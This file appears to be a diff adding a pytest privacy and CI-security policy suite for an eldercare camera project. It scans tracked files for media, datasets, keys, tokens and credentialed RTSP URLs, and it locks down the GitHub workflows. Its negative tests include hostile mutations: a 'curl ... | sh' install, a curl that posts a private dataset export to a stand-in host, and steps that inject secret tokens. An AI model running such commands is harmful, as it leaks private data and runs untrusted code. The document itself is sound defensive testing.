@@ -1,0 +1,909 @@
+from __future__ import annotations
+
+import copy
+import csv
+import functools
+import json
+import re
+import subprocess
+from pathlib import Path
+
+import pytest
+import yaml
+
+ROOT = Path(__file__).resolve().parents[1]
+
+_PROHIBITED_SUFFIXES = {
+    ".7z",
+    ".arrow",
+    ".avi",
+    ".bmp",
+    ".ckpt",
+    ".csv",
+    ".db",
+    ".feather",
+    ".dcm",
+    ".dicom",
+    ".gif",
+    ".flac",
+    ".gz",
+    ".h5",
+    ".jpeg",
+    ".jpg",
+    ".jsonl",
+    ".ico",
+    ".m4a",
+    ".mkv",
+    ".mov",
+    ".mp3",
+    ".mp4",
+    ".ndjson",
+    ".lz4",
+    ".onnx",
+    ".parquet",
+    ".pdf",
+    ".png",
+    ".pte",
+    ".pt",
+    ".pth",
+    ".rar",
+    ".sqlite",
+    ".safetensors",
+    ".tar",
+    ".wasm",
+    ".tflite",
+    ".tif",
+    ".tiff",
+    ".tsv",
+    ".wav",
+    ".webm",
+    ".webp",
+    ".zip",
+}
+_PROHIBITED_PATH_PARTS = {
+    "annotations",
+    "checkpoints",
+    "data",
+    "dataset",
+    "datasets",
+    "eval",
+    "evaluation",
+    "exports",
+    "labels",
+    "linkage",
+    "models",
+    "weights",
+}
+_MEDIA_OR_ARCHIVE_MAGIC = (
+    b"\x00\x00\x01\x00",
+    b"\x00asm",
+    b"\x04\x22\x4d\x18",
+    b"!<arch>\n",
+    b"%PDF",
+    b"SQLite format 3\x00",
+    b"fLaC",
+    b"\x1aE\xdf\xa3",
+    b"\x1f\x8b",
+    b"\x28\xb5\x2f\xfd",
+    b"\x7fELF",
+    b"\xfd7zXZ\x00",
+    b"7z\xbc\xaf\x27\x1c",
+    b"BM",
+    b"BZh",
+    b"GIF8",
+    b"ID3",
+    b"II*\x00",
+    b"MM\x00*",
+    b"OggS",
+    b"PK\x03\x04",
+    b"Rar!\x1a\x07",
+    b"\x89PNG\r\n\x1a\n",
+    b"\xff\xd8\xff",
+    b"version https://git-lfs.github.com/spec/v1",
+)
+_SYNTHETIC_RTSP_FIXTURES = {
+    Path("front/src/features/camera-management/CameraManagementPage.test.tsx"): {
+        "rtsp://user:***@redacted-camera/live",
+    },
+    Path("front/src/features/cameras/AddCameraModal.test.tsx"): {
+        "rtsp://operator:***@192.0.2.10:8554/live",
+        "rtsp://operator:secret@192.0.2.10:8554/trackID=1?profile=main",
+        "rtsp" "://operator:camera-password@camera.local:554/"
+        "trackID=1?profile=main&opaque-secret-token&another%2Dsecret"
+        "#token=fragment-secret",
+        "rtsp" "://operator:camera-password@[invalid-host:554/"
+        "trackID=1?profile=main&token=query-secret&token=second-secret",
+        "rtsp://***@[invalid-host:554/"
+        "trackID=1?profile=***&token=***&token=***",
+    },
+    Path("front/src/features/cameras/CameraCard.test.tsx"): {
+        "rtsp://user:****@camera.local/stream",
+    },
+    Path("front/src/shared/api/normalizers.test.ts"): {
+        "rtsp://operator:hunter2@camera.internal.example:554/stream",
+    },
+    Path("tests/test_api_camera_registry.py"): {
+        "rtsp://user:secret@camera.local:8554/live",
+        "rtsp://***:***@redacted-camera:8554/live",
+        "rtsp://user:secret@local/stream",
+        "rtsp://***:***@redacted-camera/stream",
+    },
+    Path("tests/test_sources_rtsp.py"): {
+        "rtsp://user:password@camera.local/live",
+        "rtsp://user:secret@camera.local/live?token=abc",
+        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
+        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
+        "rtsp://user:password@host/stream",
+        "rtsp://***:***@host/stream",
+        "rtsp://user:password@host/stream"
+        "?profile=main&username=admin&secret=abc#fragment-secret",
+        "rtsp://user:password@host/stream"
+        "?profile=main&username=admin&secret=abc",
+        "rtsp://***:***@host/stream"
+        "?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
+    },
+    Path("tests/test_catalog_verify.py"): {
+        "rtsp://operator:fixture-password@192.0.2.10/s",
+        "rtsp://operator:fixture-password@192.0.2.11/s",
+    },
+    Path("tests/test_clips_catalog.py"): {
+        "rtsp://operator:fixture-password@example.test/live",
+    },
+    Path("tests/test_worker_mjpeg_server.py"): {
+        "rtsp://user:secret@camera.local/trackID=2",
+        "rtsp://***:***@camera/track",
+    },
+    Path("tests/test_public_repository_privacy.py"): {
+        "rtsps" "://operator:not-a-fixture@camera.example/stream",
+        "rtsps" "://operator:secret@camera.example/stream",
+    },
+}
+_TEXT_PATTERNS = {
+    "private-key": re.compile(
+        r"-----BEGIN (?:EC |OPENSSH |PGP |RSA )?PRIVATE KEY-----"
+    ),
+    "credentialed-rtsp": re.compile(
+        r"rtsps?://(?P<username>[^/\s:@]+):(?P<password>[^@\s/]+)"
+        r"@(?P<host>[^/\s\"']+)(?:/[^\s\"']*)?",
+        re.IGNORECASE,
+    ),
+    "rtsp-query-secret": re.compile(
+        r"rtsps?://[^\s\"']*[?&](?:token|secret|password|username)="
+        r"[^&#\s\"']+",
+        re.IGNORECASE,
+    ),
+    "github-token": re.compile(
+        r"(?:gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})"
+    ),
+    "aws-access-key": re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}"),
+    "encoded-media-data-uri": re.compile(
+        r"data:[^;,\r\n]{1,128};base64,",
+        re.IGNORECASE,
+    ),
+    "hex-encoded-media-signature": re.compile(
+        r"(?:8950" r"4e470d0a1a0a|2550" r"4446|ffd8" r"ff|504b" r"0304)",
+        re.IGNORECASE,
+    ),
+}
+
+
+def _validate_index_mode(mode: bytes, path: bytes) -> None:
+    if mode not in {b"100644", b"100755"}:
+        raise AssertionError(
+            f"non-regular index entry: {path.decode(errors='replace')} ({mode.decode()})"
+        )
+
+
+@functools.cache
+def _index_blobs() -> tuple[tuple[Path, bytes], ...]:
+    result = subprocess.run(
+        ["git", "ls-files", "--stage", "-z"],
+        cwd=ROOT,
+        check=True,
+        capture_output=True,
+    )
+    blobs: list[tuple[Path, bytes]] = []
+    for record in result.stdout.split(b"\0"):
+        if not record:
+            continue
+        metadata, raw_path = record.split(b"\t", 1)
+        mode, oid, stage = metadata.split()
+        if stage != b"0":
+            raise AssertionError(f"unmerged index entry: {raw_path.decode(errors='replace')}")
+        _validate_index_mode(mode, raw_path)
+        blob = subprocess.run(
+            ["git", "cat-file", "blob", oid.decode("ascii")],
+            cwd=ROOT,
+            check=True,
+            capture_output=True,
+        ).stdout
+        blobs.append((Path(raw_path.decode("utf-8")), blob))
+    return tuple(blobs)
+
+
+def _looks_like_media_or_archive(blob: bytes) -> bool:
+    if blob.startswith(_MEDIA_OR_ARCHIVE_MAGIC):
+        return True
+    if len(blob) >= 12 and blob[4:8] == b"ftyp":
+        return True
+    if len(blob) >= 12 and blob[8:12] in {b"AVI ", b"WAVE", b"WEBP"}:
+        return True
+    if len(blob) >= 132 and blob[128:132] == b"DICM":
+        return True
+    return len(blob) >= 262 and blob[257:262] == b"ustar"
+
+
+def _collect_mapping_keys(value: object) -> set[str]:
+    keys: set[str] = set()
+    if isinstance(value, dict):
+        for key, child in value.items():
+            keys.add(str(key).strip().lower())
+            keys.update(_collect_mapping_keys(child))
+    elif isinstance(value, list):
+        for child in value:
+            keys.update(_collect_mapping_keys(child))
+    return keys
+
+
+def _structured_document_keys(text: str) -> set[str]:
+    significant_lines = [
+        line.strip()
+        for line in text.splitlines()
+        if line.strip()
+        and not line.lstrip().startswith("#")
+        and line.strip() != "---"
+        and not line.strip().startswith("%YAML")
+    ]
+    if not significant_lines:
+        return set()
+    first = significant_lines[0]
+    structured_header = re.compile(
+        r"""^["']?[A-Za-z_][A-Za-z0-9_]*["']?\s*:"""
+    )
+    collection_start = first.startswith(("{", "[", "-"))
+    if first.startswith(("{", "[")):
+        try:
+            return _collect_mapping_keys(json.loads(text))
+        except json.JSONDecodeError:
+            pass
+    if not collection_start and not structured_header.match(first):
+        return set()
+    try:
+        return _collect_mapping_keys(yaml.load(text, Loader=yaml.BaseLoader))
+    except yaml.YAMLError:
+        return set()
+
+
+def _looks_like_sensitive_dataset(blob: bytes) -> bool:
+    try:
+        text = blob.decode("utf-8-sig")
+    except UnicodeDecodeError:
+        return False
+    first_line = next((line for line in text.splitlines() if line.strip()), "")
+    if not first_line:
+        return False
+
+    identity_fields = {"camera_id", "facility_id", "resident_id", "subject_id"}
+    evidence_fields = {"annotation", "fall", "file_path", "frame_path", "label"}
+
+    structured_fields = _structured_document_keys(text)
+    if len(structured_fields & identity_fields) >= 2:
+        return True
+    if structured_fields & identity_fields and structured_fields & evidence_fields:
+        return True
+
+    for delimiter in (",", ";", "\t"):
+        fields = {
+            field.strip().lower()
+            for field in next(csv.reader([first_line], delimiter=delimiter))
+        }
+        if len(fields & identity_fields) >= 2:
+            return True
+        if fields & identity_fields and fields & evidence_fields:
+            return True
+    return False
+
+
+def _is_explicit_synthetic_rtsp(relative: Path, match: re.Match[str]) -> bool:
+    value = match.group(0)
+    if value in _SYNTHETIC_RTSP_FIXTURES.get(relative, set()):
+        return True
+    policy_path = Path("tests/test_public_repository_privacy.py")
+    return relative == policy_path and any(
+        value in fixtures for fixtures in _SYNTHETIC_RTSP_FIXTURES.values()
+    )
+
+
+def _has_url_safe_or_wrapped_base64(text: str) -> bool:
+    contiguous = r"(?<![A-Za-z0-9+/_-])[A-Za-z0-9+/_-]{512,}"
+    if re.search(contiguous, text):
+        return True
+
+    for block in re.split(r"\n[ \t]*\n", text):
+        payload_lines = [
+            re.sub(r"^\s*(?:#|//)\s?", "", line)
+            for line in block.splitlines()
+        ]
+        candidate = re.sub(r"\s+", "", "".join(payload_lines))
+        if len(candidate.rstrip("=")) >= 512 and re.fullmatch(
+            r"[A-Za-z0-9+/_-]+={0,2}", candidate
+        ):
+            return True
+    return False
+
+
+def _text_violation_labels(relative: Path, text: str) -> set[str]:
+    violations: set[str] = set()
+    for label, pattern in _TEXT_PATTERNS.items():
+        scan_text = text
+        if label in {"credentialed-rtsp", "rtsp-query-secret"}:
+            scan_text = re.sub(r"""(["'])\s*(?:\+\s*)?["']""", "", text)
+        matches = list(pattern.finditer(scan_text))
+        if label in {"credentialed-rtsp", "rtsp-query-secret"}:
+            matches = [
+                match
+                for match in matches
+                if not _is_explicit_synthetic_rtsp(relative, match)
+            ]
+        if matches:
+            violations.add(label)
+    if _has_url_safe_or_wrapped_base64(text):
+        violations.add("url-safe-or-wrapped-base64")
+    return violations
+
+
+def _contains_forbidden_control_bytes(blob: bytes) -> bool:
+    return any(byte < 9 or 13 < byte < 32 for byte in blob)
+
+
+def _is_public_safe_structured_fixture(relative: Path, blob: bytes) -> bool:
+    if relative != Path("edge/ml-worker.example.yaml"):
+        return False
+    document = yaml.load(blob, Loader=yaml.BaseLoader)
+    if not isinstance(document, dict):
+        return False
+    identity_keys = {"camera_id", "facility_id", "resident_id", "subject_id"}
+    outside_cameras = {
+        key: value for key, value in document.items() if key != "cameras"
+    }
+    if _collect_mapping_keys(outside_cameras) & identity_keys:
+        return False
+    cameras = document.get("cameras")
+    if not isinstance(cameras, list) or not cameras:
+        return False
+    allowed_camera_keys = {
+        "camera_id",
+        "facility_id",
+        "resident_id",
+        "rtsp_url",
+        "heartbeat_interval_sec",
+        "frame_stride",
+        "label",
+    }
+    for camera in cameras:
+        if not isinstance(camera, dict) or set(camera) != allowed_camera_keys:
+            return False
+        if not re.fullmatch(r"camera-\d+", str(camera.get("camera_id", ""))):
+            return False
+        if not re.fullmatch(r"facility-\d+", str(camera.get("facility_id", ""))):
+            return False
+        if not re.fullmatch(r"resident-\d+", str(camera.get("resident_id", ""))):
+            return False
+        rtsp_url = str(camera.get("rtsp_url", ""))
+        if not re.fullmatch(r"rtsp://camera-\d+\.local/trackID=\d+", rtsp_url):
+            return False
+        if not re.fullmatch(r"Room \d+", str(camera.get("label", ""))):
+            return False
+    return True
+
+
+def _is_prohibited_path(relative: Path) -> bool:
+    lowered_parts = {part.lower() for part in relative.parts}
+    lowered_suffixes = {suffix.lower() for suffix in relative.suffixes}
+    return bool(
+        lowered_parts & _PROHIBITED_PATH_PARTS
+        or lowered_suffixes & _PROHIBITED_SUFFIXES
+    )
+
+
+def test_tracked_tree_contains_no_data_or_private_binary_assets() -> None:
+    violations: list[str] = []
+    for relative, blob in _index_blobs():
+        if _is_prohibited_path(relative):
+            violations.append(str(relative))
+            continue
+        is_private_structured_data = (
+            _looks_like_sensitive_dataset(blob)
+            and not _is_public_safe_structured_fixture(relative, blob)
+        )
+        if _contains_forbidden_control_bytes(blob):
+            violations.append(f"{relative}:control-bytes")
+            continue
+        if _looks_like_media_or_archive(blob) or is_private_structured_data:
+            violations.append(str(relative))
+            continue
+        try:
+            blob.decode("utf-8")
+        except UnicodeDecodeError:
+            violations.append(f"{relative}:unknown-binary")
+
+    assert violations == []
+
+
+def test_tracked_text_contains_no_embedded_secret_or_media_payload() -> None:
+    violations: list[str] = []
+
+    for relative, blob in _index_blobs():
+        try:
+            text = blob.decode("utf-8")
+        except UnicodeDecodeError:
+            continue
+        violations.extend(
+            f"{relative}:{label}"
+            for label in sorted(_text_violation_labels(relative, text))
+        )
+
+    assert violations == []
+
+
+@pytest.mark.parametrize(
+    ("text", "expected_label"),
+    [
+        ("A" * 512, "url-safe-or-wrapped-base64"),
+        ("data" + ":image/png;base64," + "A" * 64, "encoded-media-data-uri"),
+        ("_" * 512, "url-safe-or-wrapped-base64"),
+        ("\n".join(["A" * 64] * 8), "url-safe-or-wrapped-base64"),
+        (
+            "data" + ":application/pdf;base64," + "A" * 64,
+            "encoded-media-data-uri",
+        ),
+        (" ".join(["A" * 16] * 32), "url-safe-or-wrapped-base64"),
+        (
+            "\n".join(["A" * 64, "# split"] * 8),
+            "url-safe-or-wrapped-base64",
+        ),
+        (
+            "\n".join(["# " + "A" * 64] * 8),
+            "url-safe-or-wrapped-base64",
+        ),
+        ("8950" "4e470d0a1a0a" + "00" * 32, "hex-encoded-media-signature"),
+        (
+            "rtsps" "://operator:not-a-fixture@camera.example/stream",
+            "credentialed-rtsp",
+        ),
+    ],
+)
+def test_text_scanner_rejects_encoded_payloads(
+    text: str, expected_label: str
+) -> None:
+    labels = _text_violation_labels(Path("synthetic-input.txt"), text)
+    assert expected_label in labels
+
+
+def test_text_scanner_allows_short_encoded_looking_text() -> None:
+    assert _text_violation_labels(Path("synthetic-input.txt"), "A" * 63) == set()
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        Path("Data/export.txt"),
+        Path("models/weights.txt"),
+        Path("public/disguised.CSV.txt"),
+        Path("public/clip.MP4.backup"),
+    ],
+)
+def test_path_policy_rejects_case_and_double_extension_evasions(path: Path) -> None:
+    assert _is_prohibited_path(path)
+
+
+@pytest.mark.parametrize(
+    "blob",
+    [
+        "facility_id,resident_id\nfacility,resident".encode("utf-16le"),
+        "facility_id,resident_id\nfacility,resident".encode("utf-16be"),
+        ("rtsps" "://operator:secret@camera.example/stream").encode("utf-32le"),
+        b"safe-prefix\x00hidden",
+    ],
+)
+def test_control_byte_gate_rejects_alternate_encodings(blob: bytes) -> None:
+    assert _contains_forbidden_control_bytes(blob)
+
+
+@pytest.mark.parametrize(
+    "blob",
+    [
+        b"\x89PNG\r\n\x1a\npayload",
+        b"PK\x03\x04archive",
+        b"facility_id,resident_id,label\nfacility,resident,fall",
+        b"camera_id\tframe_path\tannotation\ncamera\tframe.jpg\tfall",
+    ],
+)
+def test_content_classifier_rejects_disguised_private_assets(blob: bytes) -> None:
+    assert _looks_like_media_or_archive(blob) or _looks_like_sensitive_dataset(blob)
+
+@pytest.mark.parametrize(
+    "blob",
+    [
+        b"BZh91AY&SY",
+        b"\xfd7zXZ\x00payload",
+        b"\x28\xb5\x2f\xfdpayload",
+        b"\x1aE\xdf\xa3payload",
+        b"ID3payload",
+        b"%PDF-1.7",
+        b"SQLite format 3\x00payload",
+        b"fLaCpayload",
+        b"\x00asmpayload",
+        b"\x04\x22\x4d\x18payload",
+        b"\x00\x00\x01\x00payload",
+        b"!<arch>\npayload",
+        b"\x00" * 128 + b"DICMpayload",
+        b"facility_id,resident_id\nfacility,resident",
+        b'{"facility_id":"facility","subject_id":"subject"}',
+        b"version https://git-lfs.github.com/spec/v1\n"
+        b"oid sha256:0000000000000000000000000000000000000000000000000000000000000000\n"
+        b"size 1024\n",
+        b"facility_id: facility\nresident_id: resident\n",
+        b'{\n  "records": [\n'
+        b'    {"facility_id": "facility", "resident_id": "resident"}\n'
+        b"  ]\n}\n",
+        b"# synthetic adversarial document\n---\nrecords:\n"
+        b"  - facility_id: facility\n"
+        b"    resident_id: resident\n",
+        b"- facility_id: facility\n  resident_id: resident\n",
+        b"{facility_id: facility, resident_id: resident}\n",
+        b'\xef\xbb\xbf"facility_id","frame_path","annotation"\n'
+        b'"facility","frame.jpg","fall"',
+    ],
+)
+def test_classifier_rejects_additional_disguised_private_assets(blob: bytes) -> None:
+    assert _looks_like_media_or_archive(blob) or _looks_like_sensitive_dataset(blob)
+
+
+@pytest.mark.parametrize(
+    "blob",
+    [
+        b"def camera_id() -> str:\n    return 'camera-a'\n",
+        b"public equations and source schemas remain allowed\n",
+    ],
+)
+def test_classifier_allows_public_safe_source_text(blob: bytes) -> None:
+    assert not _looks_like_media_or_archive(blob)
+    assert not _looks_like_sensitive_dataset(blob)
+
+
+def test_public_worker_example_allowlist_is_closed_world() -> None:
+    relative = Path("edge/ml-worker.example.yaml")
+    blob = next(blob for path, blob in _index_blobs() if path == relative)
+    assert _is_public_safe_structured_fixture(relative, blob)
+
+    camera_mutation = yaml.load(blob, Loader=yaml.BaseLoader)
+    camera_mutation["cameras"][0]["subject_id"] = "subject"
+    assert not _is_public_safe_structured_fixture(
+        relative, yaml.safe_dump(camera_mutation).encode()
+    )
+
+    nested_mutation = yaml.load(blob, Loader=yaml.BaseLoader)
+    nested_mutation["private_records"] = [
+        {"facility_id": "facility", "resident_id": "resident"}
+    ]
+    assert not _is_public_safe_structured_fixture(
+        relative, yaml.safe_dump(nested_mutation).encode()
+    )
+
+
+def test_ignore_policy_has_no_data_exception() -> None:
+    ignore_blob = next(
+        blob for relative, blob in _index_blobs() if relative == Path(".gitignore")
+    )
+    lines = ignore_blob.decode("utf-8").splitlines()
+    assert "data/" in lines
+    assert not any(line.startswith("!data/") for line in lines)
+
+
+def _workflow(name: str) -> dict[str, object]:
+    path = ROOT / ".github" / "workflows" / name
+    for relative, blob in _index_blobs():
+        if relative == path.relative_to(ROOT):
+            loaded = yaml.load(blob, Loader=yaml.BaseLoader)
+            assert isinstance(loaded, dict)
+            return loaded
+    raise AssertionError(f"workflow is not tracked: {name}")
+
+
+def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
+    assert set(workflow) == {"jobs", "name", "on", "permissions"}
+    assert workflow["on"] == {"pull_request": "", "push": ""}
+    assert workflow["permissions"] == {"contents": "read"}
+
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    assert set(jobs) == {"test"}
+    job = jobs["test"]
+    assert isinstance(job, dict)
+    assert set(job) == {"runs-on", "steps"}
+    assert job["runs-on"] == "ubuntu-latest"
+    steps = job["steps"]
+    assert isinstance(steps, list)
+    assert steps == [
+        {
+            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
+            "with": {"persist-credentials": "false"},
+        },
+        {
+            "name": "Scan tracked tree for secrets",
+            "run": (
+                'docker run --rm -v "$GITHUB_WORKSPACE:/repo:ro" '
+                "zricethezav/gitleaks@sha256:"
+                "691af3c7c5a48b16f187ce3446d5f194838f91238f27270ed36eef6359a574d9 "
+                "detect --source=/repo --no-git --redact --exit-code=1"
+            ),
+        },
+        {
+            "uses": "astral-sh/setup-uv@"
+            "d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
+            "with": {"enable-cache": "false", "version": "0.11.27"},
+        },
+        {
+            "name": "Install FFmpeg test dependency",
+            "run": "sudo apt-get update && sudo apt-get install --yes ffmpeg",
+        },
+        {"run": "uv sync --frozen --group lint"},
+        {"run": "uv run pytest -q"},
+        {"run": "uv run --group lint ruff check ."},
+        {"run": "uv run --group lint lint-imports"},
+    ]
+
+    serialized = yaml.safe_dump(workflow)
+    assert "eldercare-dataset-ops" not in serialized
+    assert "DATASET_OPS_TOKEN" not in serialized
+    assert ".dataset-ops" not in serialized
+    assert "upload-artifact" not in serialized
+    assert "actions/cache" not in serialized
+
+
+@pytest.mark.parametrize("mode", [b"120000", b"160000"])
+def test_index_policy_rejects_linkage_modes(mode: bytes) -> None:
+    with pytest.raises(AssertionError):
+        _validate_index_mode(mode, b"synthetic-link")
+
+
+def test_untrusted_ci_has_no_private_repository_access() -> None:
+    _assert_untrusted_ci_security(_workflow("ci.yml"))
+
+
+@pytest.mark.parametrize(
+    ("step_index", "field", "value"),
+    [
+        (0, "uses", "actions/checkout@v4"),
+        (1, "run", "echo gitleaks@sha256:placeholder"),
+        (2, "uses", "astral-sh/setup-uv@v5"),
+        (3, "run", "curl https://example.invalid/install | sh"),
+        (6, "run", "uvx ruff check ."),
+    ],
+)
+def test_untrusted_ci_policy_rejects_security_mutations(
+    step_index: int, field: str, value: str
+) -> None:
+    workflow = copy.deepcopy(_workflow("ci.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    job = jobs["test"]
+    assert isinstance(job, dict)
+    steps = job["steps"]
+    assert isinstance(steps, list)
+    steps[step_index][field] = value
+
+    with pytest.raises(AssertionError):
+        _assert_untrusted_ci_security(workflow)
+
+
+@pytest.mark.parametrize(
+    ("field", "value"),
+    [
+        ("on", {"push": "", "pull_request": {"paths": ["src/**"]}}),
+        ("permissions", {"contents": "write"}),
+        ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
+        ("defaults", {"run": {"shell": "bash"}}),
+    ],
+)
+def test_untrusted_ci_policy_rejects_boundary_mutations(
+    field: str, value: object
+) -> None:
+    workflow = copy.deepcopy(_workflow("ci.yml"))
+    workflow[field] = value
+
+    with pytest.raises(AssertionError):
+        _assert_untrusted_ci_security(workflow)
+
+
+def test_untrusted_ci_policy_rejects_extra_job() -> None:
+    workflow = copy.deepcopy(_workflow("ci.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    jobs["exfiltrate"] = {"runs-on": "ubuntu-latest", "steps": []}
+
+    with pytest.raises(AssertionError):
+        _assert_untrusted_ci_security(workflow)
+
+
+@pytest.mark.parametrize(
+    ("field", "value"),
+    [
+        ("continue-on-error", "true"),
+        ("if", "false"),
+        ("runs-on", "self-hosted"),
+        ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
+    ],
+)
+def test_untrusted_ci_policy_rejects_job_mutations(
+    field: str, value: object
+) -> None:
+    workflow = copy.deepcopy(_workflow("ci.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    job = jobs["test"]
+    assert isinstance(job, dict)
+    job[field] = value
+
+    with pytest.raises(AssertionError):
+        _assert_untrusted_ci_security(workflow)
+
+
+def _assert_trusted_contract_drift_security(workflow: dict[str, object]) -> None:
+    assert set(workflow) == {"jobs", "name", "on", "permissions"}
+    events = workflow["on"]
+    assert events == {
+        "push": {
+            "branches": ["main"],
+            "paths": [
+                "contracts/**",
+                "tests/test_vendor_drift.py",
+                ".github/workflows/contract-drift.yml",
+            ],
+        }
+    }
+    assert workflow["permissions"] == {"contents": "read"}
+
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    assert set(jobs) == {"verify"}
+    verify = jobs["verify"]
+    assert isinstance(verify, dict)
+    assert set(verify) == {"env", "runs-on", "steps"}
+    assert verify["runs-on"] == "ubuntu-latest"
+    assert verify["env"] == {
+        "DATASET_OPS_REQUIRED": "1",
+        "DATASET_OPS_REPO": "${{ github.workspace }}/.dataset-ops",
+    }
+    steps = verify["steps"]
+    assert isinstance(steps, list)
+    assert steps == [
+        {
+            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
+            "with": {"persist-credentials": "false"},
+        },
+        {
+            "uses": "astral-sh/setup-uv@"
+            "d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
+            "with": {"enable-cache": "false", "version": "0.11.27"},
+        },
+        {"run": "uv sync --frozen"},
+        {
+            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
+            "with": {
+                "repository": "SeniorAILab/eldercare-dataset-ops",
+                "path": ".dataset-ops",
+                "token": "${{ secrets.DATASET_OPS_TOKEN }}",
+                "persist-credentials": "false",
+                "fetch-depth": "1",
+                "sparse-checkout": "ml/contracts\n",
+                "sparse-checkout-cone-mode": "false",
+            },
+        },
+        {
+            "name": "Verify vendored contracts",
+            "shell": "bash",
+            "run": (
+                "set +e\n"
+                'uv run pytest -q tests/test_vendor_drift.py > "$RUNNER_TEMP/'
+                'contract-drift.log" 2>&1\n'
+                "status=$?\n"
+                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
+                "if (( status != 0 )); then\n"
+                '  echo "::error::Vendored contract drift verification failed; '
+                'details suppressed."\n'
+                '  exit "$status"\n'
+                "fi\n"
+            ),
+        },
+        {
+            "name": "Remove private checkout",
+            "if": "always()",
+            "shell": "bash",
+            "run": (
+                'rm -rf -- "${{ github.workspace }}/.dataset-ops"\n'
+                'rm -f -- "$RUNNER_TEMP/contract-drift.log"\n'
+            ),
+        },
+    ]
+
+
+def test_trusted_contract_drift_workflow_is_non_persistent() -> None:
+    workflow = _workflow("contract-drift.yml")
+    _assert_trusted_contract_drift_security(workflow)
+
+    serialized = yaml.safe_dump(workflow)
+    assert "upload-artifact" not in serialized
+    assert "actions/cache" not in serialized
+
+
+@pytest.mark.parametrize(
+    ("step_index", "field", "value"),
+    [
+        (0, "uses", "actions/checkout@v4"),
+        (1, "uses", "astral-sh/setup-uv@v5"),
+        (4, "run", "curl https://example.invalid --data-binary @.dataset-ops/export"),
+        (5, "if", "success()"),
+    ],
+)
+def test_trusted_contract_policy_rejects_security_mutations(
+    step_index: int, field: str, value: str
+) -> None:
+    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    job = jobs["verify"]
+    assert isinstance(job, dict)
+    steps = job["steps"]
+    assert isinstance(steps, list)
+    steps[step_index][field] = value
+
+    with pytest.raises(AssertionError):
+        _assert_trusted_contract_drift_security(workflow)
+
+
+@pytest.mark.parametrize(
+    ("field", "value"),
+    [
+        ("continue-on-error", "true"),
+        ("if", "false"),
+        ("runs-on", "self-hosted"),
+        ("container", "unreviewed/image:latest"),
+    ],
+)
+def test_trusted_contract_policy_rejects_job_mutations(
+    field: str, value: object
+) -> None:
+    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    job = jobs["verify"]
+    assert isinstance(job, dict)
+    job[field] = value
+
+    with pytest.raises(AssertionError):
+        _assert_trusted_contract_drift_security(workflow)
+
+
+@pytest.mark.parametrize(
+    ("field", "value"),
+    [
+        ("DATASET_OPS_REQUIRED", "0"),
+        ("DATASET_OPS_REPO", "/tmp/redirected"),
+    ],
+)
+def test_trusted_contract_policy_rejects_environment_mutations(
+    field: str, value: str
+) -> None:
+    workflow = copy.deepcopy(_workflow("contract-drift.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    job = jobs["verify"]
+    assert isinstance(job, dict)
+    environment = job["env"]
+    assert isinstance(environment, dict)
+    environment[field] = value
+
+    with pytest.raises(AssertionError):
+        _assert_trusted_contract_drift_security(workflow)
